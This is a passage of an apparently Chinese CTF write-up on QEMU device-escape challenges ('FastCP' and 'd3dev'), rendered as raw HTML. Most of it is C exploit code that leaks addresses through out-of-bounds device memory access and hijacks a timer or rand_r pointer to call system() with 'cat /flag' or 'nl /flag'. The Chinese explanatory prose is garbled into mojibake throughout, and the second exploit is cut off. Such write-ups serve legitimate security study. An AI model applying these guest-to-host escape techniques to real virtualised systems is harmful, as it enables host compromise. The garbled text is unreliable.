class="keyword">int</span> <span class="title">write_CP_list_cnt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + +<span class="number">0x10</span>)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_CP_list_src</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + <span class="number">8</span>)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_cmd</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> src, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write_CP_list_cnt(cnt);</span><br><span class="line">    write_CP_list_src(src);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + +<span class="number">0x18</span>)) = cmd;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/bus/pci/devices/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x2000</span>);</span><br><span class="line">    phy_userbuf = va2pa(userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff virtual address: %p\n&quot;</span>, userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff physical address: %p\n&quot;</span>, (<span class="keyword">void</span> *)phy_userbuf);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">FastCP_CP_INFO</span> <span class="title">info</span>;</span></span><br><span class="line">    info.CP_src = <span class="literal">NULL</span>;</span><br><span class="line">    info.CP_dst = phy_userbuf;</span><br><span class="line">    info.CP_cnt = <span class="number">0x1000</span> + <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    run_cmd(<span class="number">4</span>, phy_userbuf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    info.CP_src = phy_userbuf + <span class="number">0x1000</span>;</span><br><span class="line">    info.CP_cnt = <span class="number">0x30</span>;</span><br><span class="line">    info.CP_dst = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    run_cmd(<span class="number">2</span>, phy_userbuf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    info.CP_src = <span class="literal">NULL</span>;</span><br><span class="line">    info.CP_cnt = <span class="number">0x30</span>;</span><br><span class="line">    info.CP_dst = phy_userbuf;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    run_cmd(<span class="number">4</span>, phy_userbuf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fastcp_cp_timer=&gt;%p\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x10</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, va2pa(userbuf + <span class="number">0x1000</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, va2pa(userbuf + <span class="number">0x2000</span>));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fastcp_cp_timer = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> elf_base = fastcp_cp_timer - <span class="number">0x4DCE80</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> system_addr = elf_base + <span class="number">0x2C2180</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> opaque_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> <span class="title">timer</span>;</span></span><br><span class="line"></span><br><span class="line">    timer.expire_time = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    timer.timer_list = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x8</span>);</span><br><span class="line">    timer.cb = system_addr;</span><br><span class="line">    timer.opaque = opaque_addr + <span class="number">0x1a30</span>;</span><br><span class="line">    timer.next = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x20</span>);</span><br><span class="line">    timer.attributes = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(userbuf + <span class="number">0x28</span>);</span><br><span class="line">    timer.scale = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(userbuf + <span class="number">0x2c</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;timer.command, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf + <span class="number">0x1000</span>, &amp;timer, <span class="keyword">sizeof</span>(timer));</span><br><span class="line"></span><br><span class="line">    info.CP_src = va2pa(userbuf + <span class="number">0x1000</span>) - <span class="number">0x1000</span>;</span><br><span class="line">    info.CP_cnt = <span class="number">0x1000</span> + <span class="number">0x30</span> + <span class="number">9</span>;</span><br><span class="line">    info.CP_dst = va2pa(userbuf + <span class="number">0x1000</span>) - <span class="number">0x1000</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x11</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(userbuf + i * <span class="number">0x18</span>, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_cmd(<span class="number">1</span>, phy_userbuf, <span class="number">0x11</span>);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + +<span class="number">0x18</span>)) = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230321155543134.png"                      alt="image-20230321155543134"                ></p><h2 id="d3dev"><a href="#d3dev" class="headerlink" title="d3dev"></a>d3dev</h2><p>å…ˆçœ‹çœ‹ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(16))) <span class="title">d3devState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  MemoryRegion_0 pmio;</span><br><span class="line">  <span class="keyword">uint32_t</span> memory_mode;</span><br><span class="line">  <span class="keyword">uint32_t</span> seek;</span><br><span class="line">  <span class="keyword">uint32_t</span> init_flag;</span><br><span class="line">  <span class="keyword">uint32_t</span> mmio_read_part;</span><br><span class="line">  <span class="keyword">uint32_t</span> mmio_write_part;</span><br><span class="line">  <span class="keyword">uint32_t</span> r_seed;</span><br><span class="line">  <span class="keyword">uint64_t</span> blocks[<span class="number">257</span>];</span><br><span class="line">  <span class="keyword">uint32_t</span> key[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">int</span> (*rand_r)(<span class="keyword">unsigned</span> <span class="keyword">int</span> *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="åˆ†æå‡½æ•°"><a href="#åˆ†æå‡½æ•°" class="headerlink" title="åˆ†æå‡½æ•°"></a>åˆ†æå‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">d3dev_mmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = opaque-&gt;blocks[opaque-&gt;seek + (addr &gt;&gt; <span class="number">3</span>)];</span><br><span class="line">  v4 = <span class="number">0xC6EF3720</span>;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  result = HIDWORD(v3);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(result) = result - ((v5 + v4) ^ (opaque-&gt;key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">    v5 -= (result + v4) ^ (opaque-&gt;key[<span class="number">1</span>] + (result &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">    v4 += <span class="number">0x61C88647</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 );</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;mmio_read_part )</span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mmio_read</code>å‡½æ•°è¿™é‡Œï¼Œé¦–å…ˆæ˜¯æ ¹æ®seekå’Œaddrå®šä½åˆ°æ•°æ®ï¼Œéšåå°†æ•°æ®è¿›è¡Œteaè§£å¯†ï¼Œç„¶åç¬¬ä¸€æ¬¡è¾“å‡ºä½32ä½ï¼Œç¬¬äºŒæ¬¡è¾“å‡ºé«˜32ä½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass **v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v8; <span class="comment">// r10d</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v10; <span class="comment">// r8d</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v13; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = opaque-&gt;seek + (addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      v8 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      v9 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      v10 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      v11 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      v12 = v6 + *(v5 + <span class="number">0x2B6</span>);</span><br><span class="line">      v13 = (v5[<span class="number">0x15B</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v12 += (v7 + v13) ^ (v9 + (v13 &gt;&gt; <span class="number">5</span>)) ^ (v8 + <span class="number">16</span> * v13);</span><br><span class="line">        LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 &gt;&gt; <span class="number">5</span>)) ^ (v10 + <span class="number">16</span> * v12)) + v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != <span class="number">0xC6EF3720</span> );</span><br><span class="line">      v5[<span class="number">0x15B</span>] = __PAIR64__(v13, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[v4] = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>mmio_write</code>å‡½æ•°ä¸­é¦–å…ˆä¸€æ ·å…ˆé€šè¿‡seekå’Œaddrå¾—åˆ°indexï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶æ˜¯ç›´æ¥åœ¨ä½32ä½å†™å…¥è¾“å…¥çš„æ•°æ®ï¼Œåé¢çš„åˆ™æ˜¯ä½32ä½å’Œé«˜32ä½è¿›è¡ŒteaåŠ å¯†éšåå†™å…¥åˆ°åœ°å€ä½ç½®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> *key; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;seek = val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      key = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *key++ = (opaque-&gt;rand_r)(&amp;opaque-&gt;r_seed, <span class="number">28LL</span>, val, *&amp;size);</span><br><span class="line">      <span class="keyword">while</span> ( key != &amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *opaque-&gt;key = <span class="number">0LL</span>;</span><br><span class="line">      *&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸è¯´<code>pmio_read</code>å‡½æ•°äº†ï¼Œå› ä¸ºç¡®å®æ²¡å•¥ç”¨å°±ä¸æµªè´¹ç¯‡å¹…äº†ã€‚è¿™é‡Œçœ‹<code>pmio_write</code>å‡½æ•°ï¼Œå¯ä»¥å–Šåˆ°åœ¨portç­‰äº28æ—¶ä¼šç»™<code>r_seek</code>èµ‹å€¼ï¼Œå¹¶ä¸”ä¼šè°ƒç”¨<code>opaque-&gt;rand_r</code>ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯<code>opaque-&gt;r_seed</code>çš„åœ°å€ã€‚è€Œåœ¨addrç­‰äº8å¹¶ä¸”valå°äº0x100æ—¶åˆ™æ˜¯å¾€seekä¸­å†™å…¥å€¼ã€‚å¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œæ¼æ´ä¸€æ ·æ˜¯å­˜åœ¨è¶Šç•Œä½¿ç”¨ç»“æ„ä½“ã€‚</p><h3 id="åˆ©ç”¨åˆ†æ-1"><a href="#åˆ©ç”¨åˆ†æ-1" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>è¿™é‡Œçš„åˆ©ç”¨æ€è·¯ä¹Ÿæ˜¯è¾ƒä¸ºæ¸…æ™°çš„</p><ol><li>  é¦–å…ˆä¿®æ”¹seeké…åˆaddrå®ç°ä½¿ç”¨<code>mmio_write</code>å‡½æ•°å®ç°è¶Šç•Œå†™ï¼Œå°†<code>opaque-&gt;rand_r</code>åŸæœ‰çš„å‡½æ•°åœ°å€è¿›è¡ŒteaåŠ å¯†å¹¶ä¸”å†™å…¥åˆ°å½“å‰ä½ç½®ã€‚</li><li>  ä¸¤æ¬¡è°ƒç”¨<code>mmio_read</code>å‡½æ•°ï¼Œåˆ†åˆ«è¯»å–<code>opaque-&gt;rand_r</code>é«˜ä½å’Œä½ä½æ³„æ¼å‡ºlibcåœ°å€ï¼Œè¿›è€Œæ‹¿åˆ°systemåœ°å€ã€‚</li><li>  åº”ä¸º<code>r_seek</code>æˆå‘˜å’Œ<code>blocks</code>æˆå‘˜ç´§é‚»çš„ç¼˜æ•…ï¼Œæ¢å¤seekä¸º0å¹¶é€šè¿‡addråœ¨<code>blocks</code>æˆå‘˜å¼€å§‹ä½ç½®å†™å…¥<code>flag</code></li><li>  æœ€åç›´æ¥è°ƒç”¨<code>pmio_write</code>å¹¶ä¸”portä¸º28ä¿®æ”¹<code>r_seed</code>ä¸º<code>nl /</code>å³å¯è°ƒç”¨<code>nl /flag</code></li></ol><h3 id="ç»¼ä¸Šï¼Œexp-1"><a href="#ç»¼ä¸Šï¼Œexp-1" class="headerlink" title="ç»¼ä¸Šï¼Œexp"></a>ç»¼ä¸Šï¼Œexp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> port_base = <span class="number">0xc040</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">size_t</span> port, <span class="keyword">u_int32_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(val, port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> 